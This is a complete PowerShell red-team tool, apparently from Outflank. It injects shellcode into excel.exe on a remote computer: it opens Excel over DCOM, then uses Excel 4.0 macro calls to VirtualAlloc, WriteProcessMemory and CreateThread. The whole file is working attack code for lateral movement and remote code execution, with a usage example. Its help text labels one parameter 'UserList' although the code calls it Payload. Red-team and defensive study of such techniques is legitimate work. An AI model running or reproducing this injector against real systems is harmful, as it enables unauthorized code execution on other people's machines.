#********************************************************************** 
# Invoke-Excel4DCOM.ps1 
# Inject shellcode into excel.exe via ExecuteExcel4Macro through DCOM
# Author: Stan Hegt (@StanHacked) / Outflank
# Date: 20190324
# Version: 1.0
#********************************************************************** 
 
function Invoke-Excel4DCOM
{
<#
.SYNOPSIS
Powershell script that injects shellcode into excel.exe via ExecuteExcel4Macro through DCOM.
.DESCRIPTION
Use Excel 4.0 / XLM macros on a DCOM instance of excel.exe to do shellcode injection. Works against 32 bit installs of MS Office only (fortunately, this is true for the majority of instances)!
If you receive error 80040154, make sure to execute this function from a 32 bits PowerShell host.
.PARAMETER Computername
Specify a remote host to inject into.
.PARAMETER UserList
Specify a file containing the x86 shellcode.
.EXAMPLE
PS > Invoke-Excel4DCOM -ComputerName server01 -Payload C:\temp\payload.bin
Inject x86 payload from payload.bin into excel.exe on server01.
.LINK
http://www.outflank.nl
.NOTES
Outflank - stan@outflank.nl
#> 
	[CmdletBinding()] Param(
		[Parameter(Mandatory = $true, Position = 0, ValueFromPipeline=$true)]
		[Alias("PSComputerName","MachineName","IP","IPAddress","Host")]
		[String]
		$ComputerName,
		
		[Parameter(Position = 1, Mandatory = $true)]
		[Alias("Shellcode")]
		[String]
		$Payload
	)
	if ([Environment]::Is64BitProcess) { throw "Error - please run this function from a 32 bit PowerShell host" }
	
	$excel = [activator]::CreateInstance([type]::GetTypeFromProgID("Excel.Application", "$ComputerName"))

	$sc = get-content -Encoding Byte $Payload
	
	$memaddr = $excel.ExecuteExcel4Macro('CALL("Kernel32","VirtualAlloc","JJJJJ",0,' + $sc.length + ',4096,64)')

	$count = 0
	foreach ($byte in $sc) {
		$string = "CHAR`($byte`)"
		$ret = $excel.ExecuteExcel4Macro('CALL("Kernel32","WriteProcessMemory","JJJCJJ",-1, ' + ($memaddr + $count) + ',' + $string + ', 1, 0)')
		$count = $count + 1
		
		Write-Progress -Id 1 -Activity "Invoke-Excel4DCOM" -CurrentOperation "Injecting shellcode" -PercentComplete ($count / $sc.length * 100)
	}
	
	$excel.ExecuteExcel4Macro('CALL("Kernel32","CreateThread","JJJJJJJ",0, 0, ' + $memaddr + ', 0, 0, 0)')
}